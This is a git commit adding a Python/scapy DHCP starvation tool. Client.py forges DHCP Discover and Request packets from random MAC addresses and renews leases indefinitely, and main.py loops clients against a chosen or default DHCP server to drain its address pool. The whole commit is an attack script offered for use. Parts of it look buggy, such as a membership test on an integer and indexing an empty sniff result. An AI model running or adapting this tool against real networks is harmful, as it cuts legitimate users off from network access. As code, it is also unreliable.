3a1fb5b7735a4624e2bd481ed278ec0fb97c1ec5
zeczen <seyal613@gmail.com>
2022-11-06 19:07:39 +0200

    initial commit

---
+++ Client.py
@@ -0,0 +1,131 @@
+#!/usr/bin/sudo python
+from random import randint
+from threading import Thread
+from time import sleep
+
+from scapy.arch import str2mac
+from scapy.config import conf
+from scapy.layers.dhcp import DHCP, BOOTP
+from scapy.layers.inet import IP, ICMP, UDP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sr1, sendp, sniff
+from scapy.utils import mac2str
+from scapy.volatile import RandMAC
+
+OFFER = 2
+ACK = 5
+
+TIMEOUT = 0.5
+
+
+class Client():
+# class Client(Thread):
+    iface = conf.iface  # default interface
+    target = conf.route.route("0.0.0.0")[2]  # default DHCP server
+    mac_dst = None
+    lock = None
+    persist = False
+
+    def __init__(self):
+        # Thread.__init__(self)  # generate random mac address
+        self.ch_mac = mac2str(RandMAC())
+        self.mac = str2mac(self.ch_mac)
+        self.transaction_id = randint(0, 0xffffffff)
+        self.ip = None
+
+    def run(self):
+        """
+        Discover -> Offer -> Request -> ACK
+        According to RFC 2131 (DHCPv4),
+        after receiving an ack packet the client should wait for 50% of the lease time before sending a new request.
+        If the client does not receive a response from the server,
+        the next request from the client should be after 88.5% of the lease time.
+        """
+        self.discover()
+        offer_packet = self.sniffer(OFFER)
+        if not offer_packet:
+            return  # if timeout occurs stop the current thread
+
+        self.ip = offer_packet[BOOTP].yiaddr  # get the ip address from the offer packet
+        time_for_release = 0
+        while True:  # renew the lease infinite times
+            sleep(time_for_release * 0.5)  # wait for 50% of the lease time
+            self.request()
+            ack_packet = self.sniffer(ACK)
+            if not ack_packet:  # if timeout occurs
+                return
+
+            if ack_packet[BOOTP].yiaddr != self.ip:  # if the server gave us a different IP
+                self.ip = ack_packet[BOOTP].yiaddr
+
+            time_for_release = ack_packet[DHCP].lease_time
+            self.request()
+            ack_packet = self.sniffer(ACK)
+            if ack_packet:  # receive ack packet
+                time_for_release = ack_packet[DHCP].lease_time
+                sleep(time_for_release * 0.5)  # wait for 50% of the lease time and send a new request
+                continue  # renew the lease
+            else:  # timeout occurs
+                sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
+                self.request()
+                ack_packet = self.sniffer(ACK)
+                if not ack_packet:  # receive ack packet
+                    return
+                time_for_release = ack_packet[DHCP].lease_time
+
+    def sniffer(self, op):
+        packets = sniff(
+            count=1,
+            iface=Client.iface,
+            timeout=TIMEOUT,
+            lfilter=lambda p:
+            BOOTP in p and
+            UDP in p and
+            p[UDP].sport == 67 and  # the packet is from server (OFFER or ACK)
+            p[BOOTP].xid in self.transaction_id and  # the packet is for a client we created
+            p.options[0][1] == op,
+        )
+
+        if not packets:  # if timeout occurs
+            if not Client.persist:  # we terminate the program when the server is down
+                exit()
+            if not Client.lock.locked():  # if the lock is still open
+                Client.lock.acquire()  # stop create clients, probably DHCP server is down
+                sleep(TIMEOUT * 5)  # try again
+                Client.lock.release()
+        return packets[0]
+
+    def discover(self):
+        print(f'D: {self.transaction_id}')
+        packet = Ether(
+            src=self.mac,
+            dst=Client.mac_dst
+        ) / IP(
+            src='0.0.0.0', dst='255.255.255.255'
+        ) / UDP(
+            dport=67, sport=68
+        ) / BOOTP(
+            op=1, chaddr=self.ch_mac, xid=self.transaction_id
+        ) / DHCP(
+            options=[('message-type', 'discover'),
+                     'end']
+        )
+        sendp(packet, iface=Client.iface, verbose=0)
+
+    def request(self):
+        print(f'R: {self.transaction_id}')
+        packet = Ether(
+            src=self.mac,
+            dst=Client.mac_dst
+        ) / IP(
+            src='0.0.0.0', dst='255.255.255.255'
+        ) / UDP(
+            dport=67, sport=68
+        ) / BOOTP(
+            op=3, chaddr=self.ch_mac, xid=self.transaction_id
+        ) / DHCP(
+            options=[('message-type', 'request'),
+                     ('requested_addr', self.ip),
+                     'end']
+        )
+        sendp(packet, iface=Client.iface, verbose=0)
--- main.py
+++ main.py
@@ -1,16 +1,58 @@
-# This is a sample Python script.
+import argparse
+import threading
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+from scapy.config import conf
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.layers.inet import IP, UDP, ICMP
+from scapy.layers.l2 import Ether, ARP
+from scapy.sendrecv import srp1, sr1, sendp, sniff
+from scapy.utils import mac2str
+from random import randint
+
+from Client import Client
+
+# Create the parser
+parser = argparse.ArgumentParser(prog='DHCPStarvationNEW.py', description='DHCP Starvation')
+
+# Add the arguments
+parser.add_argument('-p', '--persistent', action='store_true', help='persistent?')
+parser.add_argument('-i', '--iface', metavar='IFACE', action='store', type=str, help='Interface you wish to use')
+parser.add_argument('-t', '--target', metavar='TARGET', action='store', type=str, help='IP of target server')
+
+args = parser.parse_args()
+mac_addr = mac2str(Ether().src)
 
 
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+def get_mac(ip_addr):
+    """
+    It sends an ARP request to the IP address you specify, and returns the MAC address of the device that responds
+
+    :param ip_addr: The IP address of the target machine
+    :return: The MAC address of the IP address.
+    """
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_addr, op=1)
+    ans = srp1(packet, verbose=0)
+    return ans[Ether].src
 
 
-# Press the green button in the gutter to run the script.
+def main():
+    # if no interface is specified, use the default interface
+    Client.iface = args.iface if args.iface else conf.iface
+
+    # if no target is specified, use the default gateway
+    Client.target = args.target if args.target else conf.route.route("0.0.0.0")[2]
+
+    Client.mac_dst = get_mac(Client.target)
+
+    Client.lock = threading.Lock()
+    # if args.persistent:
+
+    while True:
+        Client.lock.acquire()
+        Client().run()
+        Client.lock.release()
+
+
 if __name__ == '__main__':
-    print_hi('PyCharm')
-
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    # exit()
+    main()
